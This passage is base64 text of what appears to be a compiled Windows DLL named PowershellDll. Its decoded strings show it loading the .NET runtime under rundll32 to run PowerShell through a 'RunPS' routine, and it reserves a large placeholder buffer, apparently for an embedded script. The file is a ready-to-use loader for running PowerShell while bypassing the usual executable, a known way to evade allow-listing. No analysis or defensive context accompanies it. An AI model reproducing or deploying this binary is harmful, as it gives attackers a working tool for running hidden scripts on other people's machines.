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AAAAAAAAAAAAAAAAAAAAAAAAACcOwAAsjsAAMI7AADUOwAAED4AAAA+AAAyPgAATj4AAGw+AACAPgAAlD4AALA+AADKPgAA4D4AAPY+AAAQPwAAJj8AACY+AAAAAAAACQAAgJsBAIAPAACAFQAAgBoAAIACAACABgAAgBYAAIAIAACAEAAAgAAAAAAEPAAAAAAAADo/AAAcPAAAnjwAADI8AABsPAAAUjwAAEg8AACEPAAAAAAAANA8AADiPAAA2DwAAAAAAACmPQAAjj0AALQ9AABWPQAAND0AABo9AAD6PAAA7jwAAHI9AAAIPQAAAAAAAGICR2V0TW9kdWxlRmlsZU5hbWVBAACoA0xvYWRMaWJyYXJ5VwAAnQJHZXRQcm9jQWRkcmVzcwAAZwJHZXRNb2R1bGVIYW5kbGVXAABLRVJORUwzMi5kbGwAAE9MRUFVVDMyLmRsbAAATgFTdHJTdHJJQQAAU0hMV0FQSS5kbGwAEABfX0N4eEZyYW1lSGFuZGxlcjMAAAEAX0N4eFRocm93RXhjZXB0aW9uAABIAG1lbXNldAAANQBfZXhjZXB0X2hhbmRsZXI0X2NvbW1vbgAhAF9fc3RkX2V4Y2VwdGlvbl9jb3B5AAAiAF9fc3RkX2V4Y2VwdGlvbl9kZXN0cm95ACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAAVkNSVU5USU1FMTQwLmRsbAAAGABmcmVlAAAZAG1hbGxvYwAACABfY2FsbG5ld2gAOABfaW5pdHRlcm0AOQBfaW5pdHRlcm1fZQBBAF9zZWhfZmlsdGVyX2RsbAAZAF9jb25maWd1cmVfbmFycm93X2FyZ3YAADUAX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAA2AF9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAPgBfcmVnaXN0ZXJfb25leGl0X2Z1bmN0aW9uACQAX2V4ZWN1dGVfb25leGl0X3RhYmxlAB8AX2NydF9hdGV4aXQAFwBfY2V4aXQAAGFwaS1tcy13aW4tY3J0LWhlYXAtbDEtMS0wLmRsbAAAYXBpLW1zLXdpbi1jcnQtcnVudGltZS1sMS0xLTAuZGxsAFACR2V0TGFzdEVycm9yAADRA011bHRpQnl0ZVRvV2lkZUNoYXIAsgNMb2NhbEZyZWUAggVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAEMFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAkCR2V0Q3VycmVudFByb2Nlc3MAYQVUZXJtaW5hdGVQcm9jZXNzAABtA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQALQRRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAKAkdldEN1cnJlbnRQcm9jZXNzSWQADgJHZXRDdXJyZW50VGhyZWFkSWQAANYCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUASwNJbml0aWFsaXplU0xpc3RIZWFkAGcDSXNEZWJ1Z2dlclByZXNlbnQARgBtZW1jcHkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBsAEAAAAAAKAAAAAAAAAAQAAoAAAAAA/////wAAAACxGb9ETuZAu3WYAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQ